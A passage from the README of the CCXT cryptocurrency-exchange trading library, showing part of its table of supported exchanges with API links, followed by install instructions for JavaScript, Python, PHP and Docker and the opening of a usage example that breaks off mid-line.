[COSS](https:\/\/www.coss.io\/c\/reg?r=OWCMHQVW2Q)                                          | 1   | [API](https:\/\/api.coss.io\/v1\/spec)                                                           | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Singapore, Netherlands                  |\n|[![crex24](https:\/\/user-images.githubusercontent.com\/1294454\/47813922-6f12cc00-dd5d-11e8-97c6-70f957712d47.jpg)](https:\/\/crex24.com\/?refid=slxsjsjtil8xexl9hksr)                               | crex24             | [CREX24](https:\/\/crex24.com\/?refid=slxsjsjtil8xexl9hksr)                                | 2   | [API](https:\/\/docs.crex24.com\/trade-api\/v2)                                                  |                                                                                                                             | Estonia                                 |\n|[![deribit](https:\/\/user-images.githubusercontent.com\/1294454\/41933112-9e2dd65a-798b-11e8-8440-5bab2959fcb8.jpg)](https:\/\/www.deribit.com\/reg-1189.4038)                                       | deribit            | [Deribit](https:\/\/www.deribit.com\/reg-1189.4038)                                        | 1   | [API](https:\/\/docs.deribit.com)                                                              |                                                                                                                             | Netherlands                             |\n|[![digifinex](https:\/\/user-images.githubusercontent.com\/1294454\/62184319-304e8880-b366-11e9-99fe-8011d6929195.jpg)](https:\/\/www.digifinex.vip\/en-ww\/from\/DhOzBg\/3798****5114)                  | digifinex          | [DigiFinex](https:\/\/www.digifinex.vip\/en-ww\/from\/DhOzBg\/3798****5114)                   | 3   | [API](https:\/\/docs.digifinex.vip)                                                            |                                                                                                                             | Singapore                               |\n|[![dsx](https:\/\/user-images.githubusercontent.com\/1294454\/27990275-1413158a-645a-11e7-931c-94717f7510e3.jpg)](https:\/\/dsx.uk)                                                                  | dsx                | [DSX](https:\/\/dsx.uk)                                                                   | 3   | [API](https:\/\/dsx.uk\/developers\/publicApi)                                                   |                                                                                                                             | UK                                      |\n|[![exmo](https:\/\/user-images.githubusercontent.com\/1294454\/27766491-1b0ea956-5eda-11e7-9225-40d67b481b8d.jpg)](https:\/\/exmo.me\/?ref=131685)                                                    | exmo               | [EXMO](https:\/\/exmo.me\/?ref=131685)                                                     | 1   | [API](https:\/\/exmo.me\/en\/api_doc?ref=131685)                                                 |                                                                                                                             | Spain, Russia                           |\n|[![exx](https:\/\/user-images.githubusercontent.com\/1294454\/37770292-fbf613d0-2de4-11e8-9f79-f2dc451b8ccb.jpg)](https:\/\/www.exx.com\/r\/fde4260159e53ab8a58cc9186d35501f?recommQd=1)               | exx                | [EXX](https:\/\/www.exx.com\/r\/fde4260159e53ab8a58cc9186d35501f?recommQd=1)                | *   | [API](https:\/\/www.exx.com\/help\/restApi)                                                      |                                                                                                                             | China                                   |\n|[![fcoin](https:\/\/user-images.githubusercontent.com\/1294454\/42244210-c8c42e1e-7f1c-11e8-8710-a5fb63b165c4.jpg)](https:\/\/www.fcoin.com\/i\/Z5P7V)                                                 | fcoin              | [FCoin](https:\/\/www.fcoin.com\/i\/Z5P7V)                                                  | 2   | [API](https:\/\/developer.fcoin.com)                                                           |                                                                                                                             | China                                   |\n|[![fcoinjp](https:\/\/user-images.githubusercontent.com\/1294454\/54219174-08b66b00-4500-11e9-862d-f522d0fe08c6.jpg)](https:\/\/www.fcoinjp.com)                                                     | fcoinjp            | [FCoinJP](https:\/\/www.fcoinjp.com)                                                      | 2   | [API](https:\/\/developer.fcoin.com)                                                           |                                                                                                                             | Japan                                   |\n|[![flowbtc](https:\/\/user-images.githubusercontent.com\/1294454\/28162465-cd815d4c-67cf-11e7-8e57-438bea0523a2.jpg)](https:\/\/www.flowbtc.com.br)                                                  | flowbtc            | [flowBTC](https:\/\/www.flowbtc.com.br)                                                   | 1   | [API](https:\/\/www.flowbtc.com.br\/api.html)                                                   |                                                                                                                             | Brazil                                  |\n|[![foxbit](https:\/\/user-images.githubusercontent.com\/1294454\/27991413-11b40d42-647f-11e7-91ee-78ced874dd09.jpg)](https:\/\/foxbit.com.br\/exchange)                                               | foxbit             | [FoxBit](https:\/\/foxbit.com.br\/exchange)                                                | 1   | [API](https:\/\/foxbit.com.br\/api\/)                                                            |                                                                                                                             | Brazil                                  |\n|[![ftx](https:\/\/user-images.githubusercontent.com\/1294454\/67149189-df896480-f2b0-11e9-8816-41593e17f9ec.jpg)](https:\/\/ftx.com\/#a=1623029)                                                      | ftx                | [FTX](https:\/\/ftx.com\/#a=1623029)                                                       | *   | [API](https:\/\/github.com\/ftexchange\/ftx)                                                     | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Hong Kong                               |\n|[![fybse](https:\/\/user-images.githubusercontent.com\/1294454\/27766512-31019772-5edb-11e7-8241-2e675e6797f1.jpg)](https:\/\/www.fybse.se)                                                          | fybse              | [FYB-SE](https:\/\/www.fybse.se)                                                          | *   | [API](https:\/\/fyb.docs.apiary.io)                                                            |                                                                                                                             | Sweden                                  |\n|[![gateio](https:\/\/user-images.githubusercontent.com\/1294454\/31784029-0313c702-b509-11e7-9ccc-bc0da6a0e435.jpg)](https:\/\/www.gate.io\/signup\/2436035)                                           | gateio             | [Gate.io](https:\/\/www.gate.io\/signup\/2436035)                                           | 2   | [API](https:\/\/gate.io\/api2)                                                                  |                                                                                                                             | China                                   |\n|[![gemini](https:\/\/user-images.githubusercontent.com\/1294454\/27816857-ce7be644-6096-11e7-82d6-3c257263229c.jpg)](https:\/\/gemini.com\/)                                                          | gemini             | [Gemini](https:\/\/gemini.com\/)                                                           | 1   | [API](https:\/\/docs.gemini.com\/rest-api)                                                      |                                                                                                                             | US                                      |\n|[![hitbtc](https:\/\/user-images.githubusercontent.com\/1294454\/27766555-8eaec20e-5edc-11e7-9c5b-6dc69fc42f5e.jpg)](https:\/\/hitbtc.com\/?ref_id=5a5d39a65d466)                                     | hitbtc             | [HitBTC](https:\/\/hitbtc.com\/?ref_id=5a5d39a65d466)                                      | 1   | [API](https:\/\/github.com\/hitbtc-com\/hitbtc-api\/blob\/master\/APIv1.md)                         |                                                                                                                             | Hong Kong                               |\n|[![hitbtc2](https:\/\/user-images.githubusercontent.com\/1294454\/27766555-8eaec20e-5edc-11e7-9c5b-6dc69fc42f5e.jpg)](https:\/\/hitbtc.com\/?ref_id=5a5d39a65d466)                                    | hitbtc2            | [HitBTC](https:\/\/hitbtc.com\/?ref_id=5a5d39a65d466)                                      | 2   | [API](https:\/\/api.hitbtc.com)                                                                |                                                                                                                             | Hong Kong                               |\n|[![huobipro](https:\/\/user-images.githubusercontent.com\/1294454\/27766569-15aa7b9a-5edd-11e7-9e7f-44791f4ee49c.jpg)](https:\/\/www.huobi.co\/en-us\/topic\/invited\/?invite_code=rwrd3)                | huobipro           | [Huobi Pro](https:\/\/www.huobi.co\/en-us\/topic\/invited\/?invite_code=rwrd3)                | 1   | [API](https:\/\/huobiapi.github.io\/docs\/spot\/v1\/cn\/)                                           |                                                                                                                             | China                                   |\n|[![huobiru](https:\/\/user-images.githubusercontent.com\/1294454\/52978816-e8552e00-33e3-11e9-98ed-845acfece834.jpg)](https:\/\/www.huobi.com.ru\/invite?invite_code=esc74)                           | huobiru            | [Huobi Russia](https:\/\/www.huobi.com.ru\/invite?invite_code=esc74)                       | 1   | [API](https:\/\/github.com\/cloudapidoc\/API_Docs_en)                                            |                                                                                                                             | Russia                                  |\n|[![ice3x](https:\/\/user-images.githubusercontent.com\/1294454\/38012176-11616c32-3269-11e8-9f05-e65cf885bb15.jpg)](https:\/\/ice3x.com?ref=14341802)                                                | ice3x              | [ICE3X](https:\/\/ice3x.com?ref=14341802)                                                 | 1   | [API](https:\/\/ice3x.co.za\/ice-cubed-bitcoin-exchange-api-documentation-1-june-2017)          |                                                                                                                             | South Africa                            |\n|[![idex](https:\/\/user-images.githubusercontent.com\/1294454\/63693236-3415e380-c81c-11e9-8600-ba1634f1407d.jpg)](https:\/\/idex.market)                                                            | idex               | [IDEX](https:\/\/idex.market)                                                             | *   | [API](https:\/\/docs.idex.market\/)                                                             | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                                      |\n|[![independentreserve](https:\/\/user-images.githubusercontent.com\/1294454\/30521662-cf3f477c-9bcb-11e7-89bc-d1ac85012eda.jpg)](https:\/\/www.independentreserve.com)                               | independentreserve | [Independent Reserve](https:\/\/www.independentreserve.com)                               | *   | [API](https:\/\/www.independentreserve.com\/API)                                                |                                                                                                                             | Australia, New Zealand                  |\n|[![indodax](https:\/\/user-images.githubusercontent.com\/1294454\/37443283-2fddd0e4-281c-11e8-9741-b4f1419001b5.jpg)](https:\/\/indodax.com\/ref\/testbitcoincoid\/1)                                   | indodax            | [INDODAX](https:\/\/indodax.com\/ref\/testbitcoincoid\/1)                                    | 1.8 | [API](https:\/\/indodax.com\/downloads\/BITCOINCOID-API-DOCUMENTATION.pdf)                       |                                                                                                                             | Indonesia                               |\n|[![itbit](https:\/\/user-images.githubusercontent.com\/1294454\/27822159-66153620-60ad-11e7-89e7-005f6d7f3de0.jpg)](https:\/\/www.itbit.com)                                                         | itbit              | [itBit](https:\/\/www.itbit.com)                                                          | 1   | [API](https:\/\/api.itbit.com\/docs)                                                            |                                                                                                                             | US                                      |\n|[![kkex](https:\/\/user-images.githubusercontent.com\/1294454\/47401462-2e59f800-d74a-11e8-814f-e4ae17b4968a.jpg)](https:\/\/kkex.com)                                                               | kkex               | [KKEX](https:\/\/kkex.com)                                                                | 2   | [API](https:\/\/kkex.com\/api_wiki\/cn\/)                                                         |                                                                                                                             | China, US, Japan                        |\n|[![kraken](https:\/\/user-images.githubusercontent.com\/1294454\/27766599-22709304-5ede-11e7-9de1-9f33732e1509.jpg)](https:\/\/www.kraken.com)                                                       | kraken             | [Kraken](https:\/\/www.kraken.com)                                                        | 0   | [API](https:\/\/www.kraken.com\/features\/api)                                                   | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                                      |\n|[![kucoin](https:\/\/user-images.githubusercontent.com\/1294454\/57369448-3cc3aa80-7196-11e9-883e-5ebeb35e4f57.jpg)](https:\/\/www.kucoin.com\/?rcode=E5wkqe)                                         | kucoin             | [KuCoin](https:\/\/www.kucoin.com\/?rcode=E5wkqe)                                          | 2   | [API](https:\/\/docs.kucoin.com)                                                               | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | Seychelles                              |\n|[![kuna](https:\/\/user-images.githubusercontent.com\/1294454\/31697638-912824fa-b3c1-11e7-8c36-cf9606eb94ac.jpg)](https:\/\/kuna.io?r=kunaid-gvfihe8az7o4)                                          | kuna               | [Kuna](https:\/\/kuna.io?r=kunaid-gvfihe8az7o4)                                           | 2   | [API](https:\/\/kuna.io\/documents\/api)                                                         |                                                                                                                             | Ukraine                                 |\n|[![lakebtc](https:\/\/user-images.githubusercontent.com\/1294454\/28074120-72b7c38a-6660-11e7-92d9-d9027502281d.jpg)](https:\/\/www.lakebtc.com)                                                     | lakebtc            | [LakeBTC](https:\/\/www.lakebtc.com)                                                      | 2   | [API](https:\/\/www.lakebtc.com\/s\/api_v2)                                                      |                                                                                                                             | US                                      |\n|[![latoken](https:\/\/user-images.githubusercontent.com\/1294454\/61511972-24c39f00-aa01-11e9-9f7c-471f1d6e5214.jpg)](https:\/\/latoken.com)                                                         | latoken            | [Latoken](https:\/\/latoken.com)                                                          | 1   | [API](https:\/\/api.latoken.com)                                                               |                                                                                                                             | Cayman Islands                          |\n|[![lbank](https:\/\/user-images.githubusercontent.com\/1294454\/38063602-9605e28a-3302-11e8-81be-64b1e53c4cfb.jpg)](https:\/\/www.lbex.io\/invite?icode=7QCY)                                         | lbank              | [LBank](https:\/\/www.lbex.io\/invite?icode=7QCY)                                          | 1   | [API](https:\/\/github.com\/LBank-exchange\/lbank-official-api-docs)                             |                                                                                                                             | China                                   |\n|[![liquid](https:\/\/user-images.githubusercontent.com\/1294454\/45798859-1a872600-bcb4-11e8-8746-69291ce87b04.jpg)](https:\/\/www.liquid.com?affiliate=SbzC62lt30976)                               | liquid             | [Liquid](https:\/\/www.liquid.com?affiliate=SbzC62lt30976)                                | 2   | [API](https:\/\/developers.liquid.com)                                                         |                                                                                                                             | Japan, China, Taiwan                    |\n|[![livecoin](https:\/\/user-images.githubusercontent.com\/1294454\/27980768-f22fc424-638a-11e7-89c9-6010a54ff9be.jpg)](https:\/\/livecoin.net\/?from=Livecoin-CQ1hfx44)                               | livecoin           | [LiveCoin](https:\/\/livecoin.net\/?from=Livecoin-CQ1hfx44)                                | *   | [API](https:\/\/www.livecoin.net\/api?lang=en)                                                  |                                                                                                                             | US, UK, Russia                          |\n|[![luno](https:\/\/user-images.githubusercontent.com\/1294454\/27766607-8c1a69d8-5ede-11e7-930c-540b5eb9be24.jpg)](https:\/\/www.luno.com\/invite\/44893A)                                             | luno               | [luno](https:\/\/www.luno.com\/invite\/44893A)                                              | 1   | [API](https:\/\/www.luno.com\/en\/api)                                                           |                                                                                                                             | UK, Singapore, South Africa             |\n|[![lykke](https:\/\/user-images.githubusercontent.com\/1294454\/34487620-3139a7b0-efe6-11e7-90f5-e520cef74451.jpg)](https:\/\/www.lykke.com)                                                         | lykke              | [Lykke](https:\/\/www.lykke.com)                                                          | 1   | [API](https:\/\/hft-api.lykke.com\/swagger\/ui\/)                                                 |                                                                                                                             | Switzerland                             |\n|[![mandala](https:\/\/user-images.githubusercontent.com\/1294454\/54686665-df629400-4b2a-11e9-84d3-d88856367dd7.jpg)](https:\/\/trade.mandalaex.com\/?ref=564377)                                     | mandala            | [Mandala](https:\/\/trade.mandalaex.com\/?ref=564377)                                      | 2   | [API](https:\/\/apidocs.mandalaex.com)                                                         |                                                                                                                             | Malta                                   |\n|[![mercado](https:\/\/user-images.githubusercontent.com\/1294454\/27837060-e7c58714-60ea-11e7-9192-f05e86adb83f.jpg)](https:\/\/www.mercadobitcoin.com.br)                                           | mercado            | [Mercado Bitcoin](https:\/\/www.mercadobitcoin.com.br)                                    | 3   | [API](https:\/\/www.mercadobitcoin.com.br\/api-doc)                                             |                                                                                                                             | Brazil                                  |\n|[![mixcoins](https:\/\/user-images.githubusercontent.com\/1294454\/30237212-ed29303c-9535-11e7-8af8-fcd381cfa20c.jpg)](https:\/\/mixcoins.com)                                                       | mixcoins           | [MixCoins](https:\/\/mixcoins.com)                                                        | 1   | [API](https:\/\/mixcoins.com\/help\/api\/)                                                        |                                                                                                                             | UK, Hong Kong                           |\n|[![oceanex](https:\/\/user-images.githubusercontent.com\/1294454\/58385970-794e2d80-8001-11e9-889c-0567cd79b78e.jpg)](https:\/\/oceanex.pro\/signup?referral=VE24QX)                                  | oceanex            | [OceanEx](https:\/\/oceanex.pro\/signup?referral=VE24QX)                                   | 1   | [API](https:\/\/api.oceanex.pro\/doc\/v1)                                                        |                                                                                                                             | US                                      |\n|[![okcoincny](https:\/\/user-images.githubusercontent.com\/1294454\/27766792-8be9157a-5ee5-11e7-926c-6d69b8d3378d.jpg)](https:\/\/www.okcoin.cn)                                                     | okcoincny          | [OKCoin CNY](https:\/\/www.okcoin.cn)                                                     | 1   | [API](https:\/\/www.okcoin.cn\/rest_getStarted.html)                                            |                                                                                                                             | China                                   |\n|[![okcoinusd](https:\/\/user-images.githubusercontent.com\/1294454\/27766791-89ffb502-5ee5-11e7-8a5b-c5950b68ac65.jpg)](https:\/\/www.okcoin.com\/account\/register?flag=activity&channelId=600001513) | okcoinusd          | [OKCoin USD](https:\/\/www.okcoin.com\/account\/register?flag=activity&channelId=600001513) | 1   | [API](https:\/\/www.okcoin.com\/docs\/en\/)                                                       |                                                                                                                             | China, US                               |\n|[![okex](https:\/\/user-images.githubusercontent.com\/1294454\/32552768-0d6dd3c6-c4a6-11e7-90f8-c043b64756a7.jpg)](https:\/\/www.okex.com)                                                           | okex               | [OKEX](https:\/\/www.okex.com)                                                            | 1   | [API](https:\/\/github.com\/okcoin-okex\/API-docs-OKEx.com)                                      |                                                                                                                             | China, US                               |\n|[![okex3](https:\/\/user-images.githubusercontent.com\/1294454\/32552768-0d6dd3c6-c4a6-11e7-90f8-c043b64756a7.jpg)](https:\/\/www.okex.com)                                                          | okex3              | [OKEX](https:\/\/www.okex.com)                                                            | 3   | [API](https:\/\/www.okex.com\/docs\/en\/)                                                         |                                                                                                                             | China, US                               |\n|[![paymium](https:\/\/user-images.githubusercontent.com\/1294454\/27790564-a945a9d4-5ff9-11e7-9d2d-b635763f2f24.jpg)](https:\/\/www.paymium.com)                                                     | paymium            | [Paymium](https:\/\/www.paymium.com)                                                      | 1   | [API](https:\/\/github.com\/Paymium\/api-documentation)                                          |                                                                                                                             | France, EU                              |\n|[![poloniex](https:\/\/user-images.githubusercontent.com\/1294454\/27766817-e9456312-5ee6-11e7-9b3c-b628ca5626a5.jpg)](https:\/\/www.poloniex.com\/?utm_source=ccxt&utm_medium=web)                   | poloniex           | [Poloniex](https:\/\/www.poloniex.com\/?utm_source=ccxt&utm_medium=web)                    | *   | [API](https:\/\/docs.poloniex.com)                                                             | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | US                                      |\n|[![rightbtc](https:\/\/user-images.githubusercontent.com\/1294454\/42633917-7d20757e-85ea-11e8-9f53-fffe9fbb7695.jpg)](https:\/\/www.rightbtc.com)                                                   | rightbtc           | [RightBTC](https:\/\/www.rightbtc.com)                                                    | *   | [API](https:\/\/docs.rightbtc.com\/api\/)                                                        |                                                                                                                             | United Arab Emirates                    |\n|[![southxchange](https:\/\/user-images.githubusercontent.com\/1294454\/27838912-4f94ec8a-60f6-11e7-9e5d-bbf9bd50a559.jpg)](https:\/\/www.southxchange.com)                                           | southxchange       | [SouthXchange](https:\/\/www.southxchange.com)                                            | *   | [API](https:\/\/www.southxchange.com\/Home\/Api)                                                 |                                                                                                                             | Argentina                               |\n|[![stex](https:\/\/user-images.githubusercontent.com\/1294454\/69680782-03fd0b80-10bd-11ea-909e-7f603500e9cc.jpg)](https:\/\/app.stex.com?ref=36416021)                                              | stex               | [STEX](https:\/\/app.stex.com?ref=36416021)                                               | 3   | [API](https:\/\/help.stex.com\/en\/collections\/1593608-api-v3-documentation)                     |                                                                                                                             | Estonia                                 |\n|[![stronghold](https:\/\/user-images.githubusercontent.com\/1294454\/52160042-98c1f300-26be-11e9-90dd-da8473944c83.jpg)](https:\/\/stronghold.co)                                                    | stronghold         | [Stronghold](https:\/\/stronghold.co)                                                     | 1   | [API](https:\/\/docs.stronghold.co)                                                            |                                                                                                                             |                                         |\n|[![surbitcoin](https:\/\/user-images.githubusercontent.com\/1294454\/27991511-f0a50194-6481-11e7-99b5-8f02932424cc.jpg)](https:\/\/surbitcoin.com)                                                   | surbitcoin         | [SurBitcoin](https:\/\/surbitcoin.com)                                                    | 1   | [API](https:\/\/blinktrade.com\/docs)                                                           |                                                                                                                             | Venezuela                               |\n|[![theocean](https:\/\/user-images.githubusercontent.com\/1294454\/43103756-d56613ce-8ed7-11e8-924e-68f9d4bcacab.jpg)](https:\/\/theocean.trade)                                                     | theocean           | [The Ocean](https:\/\/theocean.trade)                                                     | 1   | [API](https:\/\/docs.theocean.trade)                                                           |                                                                                                                             | US                                      |\n|[![therock](https:\/\/user-images.githubusercontent.com\/1294454\/27766869-75057fa2-5ee9-11e7-9a6f-13e641fa4707.jpg)](https:\/\/therocktrading.com)                                                  | therock            | [TheRockTrading](https:\/\/therocktrading.com)                                            | 1   | [API](https:\/\/api.therocktrading.com\/doc\/v1\/index.html)                                      |                                                                                                                             | Malta                                   |\n|[![tidebit](https:\/\/user-images.githubusercontent.com\/1294454\/39034921-e3acf016-4480-11e8-9945-a6086a1082fe.jpg)](http:\/\/bit.ly\/2IX0LrM)                                                       | tidebit            | [TideBit](http:\/\/bit.ly\/2IX0LrM)                                                        | 2   | [API](https:\/\/www.tidebit.com\/documents\/api\/guide)                                           |                                                                                                                             | Hong Kong                               |\n|[![tidex](https:\/\/user-images.githubusercontent.com\/1294454\/30781780-03149dc4-a12e-11e7-82bb-313b269d24d4.jpg)](https:\/\/tidex.com\/exchange\/?ref=57f5638d9cd7)                                  | tidex              | [Tidex](https:\/\/tidex.com\/exchange\/?ref=57f5638d9cd7)                                   | 3   | [API](https:\/\/tidex.com\/exchange\/public-api)                                                 |                                                                                                                             | UK                                      |\n|[![upbit](https:\/\/user-images.githubusercontent.com\/1294454\/49245610-eeaabe00-f423-11e8-9cba-4b0aed794799.jpg)](https:\/\/upbit.com)                                                             | upbit              | [Upbit](https:\/\/upbit.com)                                                              | 1   | [API](https:\/\/docs.upbit.com\/docs\/%EC%9A%94%EC%B2%AD-%EC%88%98-%EC%A0%9C%ED%95%9C)           | [![CCXT Certified](https:\/\/img.shields.io\/badge\/CCXT-certified-green.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Certification) | South Korea                             |\n|[![vaultoro](https:\/\/user-images.githubusercontent.com\/1294454\/27766880-f205e870-5ee9-11e7-8fe2-0d5b15880752.jpg)](https:\/\/www.vaultoro.com)                                                   | vaultoro           | [Vaultoro](https:\/\/www.vaultoro.com)                                                    | 1   | [API](https:\/\/api.vaultoro.com)                                                              |                                                                                                                             | Switzerland                             |\n|[![vbtc](https:\/\/user-images.githubusercontent.com\/1294454\/27991481-1f53d1d8-6481-11e7-884e-21d17e7939db.jpg)](https:\/\/vbtc.exchange)                                                          | vbtc               | [VBTC](https:\/\/vbtc.exchange)                                                           | 1   | [API](https:\/\/blinktrade.com\/docs)                                                           |                                                                                                                             | Vietnam                                 |\n|[![virwox](https:\/\/user-images.githubusercontent.com\/1294454\/27766894-6da9d360-5eea-11e7-90aa-41f2711b7405.jpg)](https:\/\/www.virwox.com)                                                       | virwox             | [VirWoX](https:\/\/www.virwox.com)                                                        | *   | [API](https:\/\/www.virwox.com\/developers.php)                                                 |                                                                                                                             | Austria, EU                             |\n|[![whitebit](https:\/\/user-images.githubusercontent.com\/1294454\/66732963-8eb7dd00-ee66-11e9-849b-10d9282bb9e0.jpg)](https:\/\/whitebit.com\/referral\/d9bdf40e-28f2-4b52-b2f9-cd1415d82963)         | whitebit           | [WhiteBit](https:\/\/whitebit.com\/referral\/d9bdf40e-28f2-4b52-b2f9-cd1415d82963)          | 2   | [API](https:\/\/documenter.getpostman.com\/view\/7473075\/SVSPomwS?version=latest#intro)          |                                                                                                                             | Estonia                                 |\n|[![xbtce](https:\/\/user-images.githubusercontent.com\/1294454\/28059414-e235970c-662c-11e7-8c3a-08e31f78684b.jpg)](https:\/\/xbtce.com\/?agent=XX97BTCXXXG687021000B)                                | xbtce              | [xBTCe](https:\/\/xbtce.com\/?agent=XX97BTCXXXG687021000B)                                 | 1   | [API](https:\/\/www.xbtce.com\/tradeapi)                                                        |                                                                                                                             | Russia                                  |\n|[![yobit](https:\/\/user-images.githubusercontent.com\/1294454\/27766910-cdcbfdae-5eea-11e7-9859-03fea873272d.jpg)](https:\/\/www.yobit.net)                                                         | yobit              | [YoBit](https:\/\/www.yobit.net)                                                          | 3   | [API](https:\/\/www.yobit.net\/en\/api\/)                                                         |                                                                                                                             | Russia                                  |\n|[![zaif](https:\/\/user-images.githubusercontent.com\/1294454\/27766927-39ca2ada-5eeb-11e7-972f-1b4199518ca6.jpg)](https:\/\/zaif.jp)                                                                | zaif               | [Zaif](https:\/\/zaif.jp)                                                                 | 1   | [API](https:\/\/techbureau-api-document.readthedocs.io\/ja\/latest\/index.html)                   |                                                                                                                             | Japan                                   |\n|[![zb](https:\/\/user-images.githubusercontent.com\/1294454\/32859187-cd5214f0-ca5e-11e7-967d-96568e2e2bd1.jpg)](https:\/\/www.zb.com)                                                               | zb                 | [ZB](https:\/\/www.zb.com)                                                                | 1   | [API](https:\/\/www.zb.com\/i\/developer)                                                        |                                                                                                                             | China                                   |\n\nThe list above is updated frequently, new crypto markets, exchanges, bug fixes, and API endpoints are introduced on a regular basis. See the [Manual](https:\/\/github.com\/ccxt\/ccxt\/wiki) for more details. If you can't find a cryptocurrency exchange in the list above and want it to be added, post a link to it by opening an issue here on GitHub or send us an email.\n\nThe library is under [MIT license](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/LICENSE.txt), that means it's absolutely free for any developer to build commercial and opensource software on top of it, but use it at your own risk with no warranties, as is.\n\n---\n\n## Install\n\nThe easiest way to install the CCXT library is to use a package manager:\n\n- [ccxt in **NPM**](https:\/\/www.npmjs.com\/package\/ccxt) (JavaScript \/ Node v7.6+)\n- [ccxt in **PyPI**](https:\/\/pypi.python.org\/pypi\/ccxt) (Python 2 and 3.5.3+)\n- [ccxt in **Packagist\/Composer**](https:\/\/packagist.org\/packages\/ccxt\/ccxt) (PHP 5.4+)\n\nThis library is shipped as an all-in-one module implementation with minimalistic dependencies and requirements:\n\n- [`js\/`](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/js\/) in JavaScript\n- [`python\/`](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/python\/) in Python (generated from JS)\n- [`php\/`](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/php\/) in PHP (generated from JS)\n\nYou can also clone it into your project directory from [ccxt GitHub repository](https:\/\/github.com\/ccxt\/ccxt):\n\n```shell\ngit clone https:\/\/github.com\/ccxt\/ccxt.git\n```\n\n### JavaScript (NPM)\n\nJavaScript version of CCXT works in both Node and web browsers. Requires ES6 and `async\/await` syntax support (Node 7.6.0+). When compiling with Webpack and Babel, make sure it is [not excluded](https:\/\/github.com\/ccxt\/ccxt\/issues\/225#issuecomment-331905178) in your `babel-loader` config.\n\n[ccxt in **NPM**](https:\/\/www.npmjs.com\/package\/ccxt)\n\n```shell\nnpm install ccxt\n```\n\n```JavaScript\nvar ccxt = require ('ccxt')\n\nconsole.log (ccxt.exchanges) \/\/ print all available exchanges\n```\n\n### JavaScript (for use with the `<script>` tag):\n\nAll-in-one browser bundle (dependencies included), served from a CDN of your choice:\n\n* jsDelivr: https:\/\/cdn.jsdelivr.net\/npm\/ccxt@1.20.68\/dist\/ccxt.browser.js\n* unpkg: https:\/\/unpkg.com\/ccxt@1.20.68\/dist\/ccxt.browser.js\n\nCDNs are not updated in real-time and may have delays. Defaulting to the most recent version without specifying the version number is not recommended. Please, keep in mind that we are not responsible for the correct operation of those CDN servers.\n\n```HTML\n<script type=\"text\/javascript\" src=\"https:\/\/cdn.jsdelivr.net\/npm\/ccxt@1.20.68\/dist\/ccxt.browser.js\"><\/script>\n```\n\nCreates a global `ccxt` object:\n\n```JavaScript\nconsole.log (ccxt.exchanges) \/\/ print all available exchanges\n```\n\n### Python\n\n[ccxt in **PyPI**](https:\/\/pypi.python.org\/pypi\/ccxt)\n\n```shell\npip install ccxt\n```\n\n```Python\nimport ccxt\nprint(ccxt.exchanges) # print a list of all available exchange classes\n```\n\nThe library supports concurrent asynchronous mode with asyncio and async\/await in Python 3.5.3+\n\n```Python\nimport ccxt.async_support as ccxt # link against the asynchronous version of ccxt\n```\n\n### PHP\n\n[ccxt in PHP with **Packagist\/Composer**](https:\/\/packagist.org\/packages\/ccxt\/ccxt) (PHP 5.4+)\n\nIt requires common PHP modules:\n\n- cURL\n- mbstring (using UTF-8 is highly recommended)\n- PCRE\n- iconv\n- gmp (this is a built-in extension as of PHP 7.2+)\n\n```PHP\ninclude \"ccxt.php\";\nvar_dump (\\ccxt\\Exchange::$exchanges); \/\/ print a list of all available exchange classes\n```\n\n### Docker\n\nYou can get CCXT installed in a container along with all the supported languages and dependencies. This may be useful if you want to contribute to CCXT (e.g. run the build scripts and tests \u2014 please see the [Contributing](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/CONTRIBUTING.md) document for the details on that).\n\nUsing `docker-compose` (in the cloned CCXT repository):\n\n```shell\ndocker-compose run --rm ccxt\n```\n\n---\n\n## Documentation\n\nRead the [Manual](https:\/\/github.com\/ccxt\/ccxt\/wiki) for more details.\n\n## Usage\n\n### Intro\n\nThe CCXT library consists of a public part and a private part. Anyone can use the public part immediately after installation. Public APIs provide unrestricted access to public information for all exchange markets without the need to register a user account or have an API key.\n\nPublic APIs include the following:\n\n- market data\n- instruments\/trading pairs\n- price feeds (exchange rates)\n- order books\n- trade history\n- tickers\n- OHLC(V) for charting\n- other public endpoints\n\nIn order to trade with private APIs you need to obtain API keys from an exchange's website. It usually means signing up to the exchange and creating API keys for your account. Some exchanges require personal info or identification. Sometimes verification may be necessary as well. In this case you will need to register yourself, this library will not create accounts or API keys for you. Some exchanges expose API endpoints for registering an account, but most exchanges don't. You will have to sign up and create API keys on their websites.\n\nPrivate APIs allow the following:\n\n- manage personal account info\n- query account balances\n- trade by making market and limit orders\n- deposit and withdraw fiat and crypto funds\n- query personal orders\n- get ledger history\n- transfer funds between accounts\n- use merchant services\n\nThis library implements full public and private REST APIs for all exchanges. WebSocket and FIX implementations in JavaScript, PHP, Python and other languages coming soon.\n\nThe CCXT library supports both camelcase notation (preferred in JavaScript) and underscore notation (preferred in Python and PHP), therefore all methods can be called in either notation or coding style in any language.\n\n```JavaScript\n\/\/ both of these notations work in JavaScript\/Python\/PHP\nexchange.methodName ()  \/\/ camelcase pseudocode\nexchange.method_name () \/\/ underscore pseudocode\n```\n\nRead the [Manual](https:\/\/github.com\/ccxt\/ccxt\/wiki) for more details.\n\n### JavaScript\n\n```JavaScript\n'use strict';\nconst ccxt = require ('ccxt');\n\n(async function () {\n    let kraken    = new ccxt.kraken ()\n    let bitfinex  = new ccxt.bitfinex ({ verbose: true })\n    let huobipro  = new ccxt.huobipro ()\n    let okcoinusd = new 